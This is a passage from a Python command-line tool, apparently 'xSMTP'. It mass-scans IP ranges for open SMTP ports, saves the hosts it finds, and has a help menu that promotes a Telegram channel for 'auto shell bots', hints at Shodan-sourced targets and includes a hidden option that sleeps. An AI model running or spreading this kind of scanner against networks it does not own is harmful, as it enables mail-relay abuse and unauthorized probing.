      pool = ThreadPool(int(tr2))
      results = pool.map(scan, lines)
      pool.close() 
      pool.join()

      with open("list.txt", 'r+') as f:
        f.truncate(0)
      print('Done')
    #########################################################
    elif ans=="2":
      print(colored("""[1] - Listen For Recommended Ports [2525,587]
[2] - Listen For All Ports [25,2525,465,587]
      """,'green'))
      method = input('> ')
      print(colored("""How many threads to use ?
(Recommended : 50)""",'green'))
      tr1 = input('> ')
      with open("ranges.txt", "r") as f:
        lines = f.readlines()
      with open("ranges.txt", "w") as f:
          for line in lines:
              noalpha = any(c.isalpha() for c in line)
              if (':' not in line) and (not noalpha):
                  f.write(line)

      #range = input('give ip range list:\n')
      print(colored('Collecting all Hosts in your Ranges.. Please Wait','blue'))
      if method == '1':
        ports = [2525,587]
      elif method == '2':
        ports = [25,2525,465,587]
      inp = []
      cip = 0
      with open('ranges.txt') as ranges:
        for range in ranges:
          range.replace("\n", "")
          for ip in ipaddress.IPv4Network(range.strip()):
            for port in ports:
              inp.append(str(ip)+':'+str(port))
              cip += 1
      print(colored(str(cip)+' Hosts collected !','blue'))
      time.sleep(2)
      pool = ThreadPool(int(tr1))
      results = pool.map(listenn, inp)
      pool.close() 
      pool.join()
      with open("ranges.txt", 'r+') as f:
        f.truncate(0)
      print(colored('Done, Hosts saved in ./list.txt','green'))
    #########################################################
    elif ans=="6":
      print('Goodbye...')
      sys.exit()
    #########################################################
    elif ans=="5":
      print(colored("""Clone from the official repo : https://github.com/c99tn/xSMTP
and run git pull to fetch and download latest updates to xSMTP!
Want to be notified on latest updates and new tools/auto shell bots ? 
join our telegram channel: https://t.me/+7wraokmFiCcxOTk0
Want to get in touch ? dm me on telegram @dpr52
      """,'magenta'))
    #########################################################
    elif ans=="4":
      print(colored('Quota Limit Reached Error ?','blue'))
      print(colored("""
This happens when you request too many ASN lookups in a single day, you will have to wait
and try again later or use your own ip ranges !
      """,'cyan'))
      print(colored('How to get good IP Ranges for SMTP ?','blue'))
      print(colored("""
Shodan, leakix, ip2info, ASN reverse .... Cant say more !
      """,'cyan'))
      print(colored('I dont recieve SMTP Test to my email ?','blue'))
      print(colored("""
Not all SMTPs deliver to your inbox, check spam folder and try to use one of the recommmended
email providers such as Yandex or Protonmail
      """,'cyan'))
      print(colored('Can I use this on a network I dont own ?','blue'))
      print(colored("""
No and this is illegal !I'm not responsible for anything you do with this tool, 
so please only use it for good and educational purposes.
      """,'cyan'))
      
    #########################################################
    elif ans=="/.!#xz":
      print('scanning Env now')
      lines = []
      with open('list.txt') as top:
        for line in top:
          lines.append(line)
      print('Scanning '+ str(len(lines)))
      time.sleep(20000)
      with open("list.txt", 'r+') as f:
        f.truncate(0)
      print('Done')
fw.close
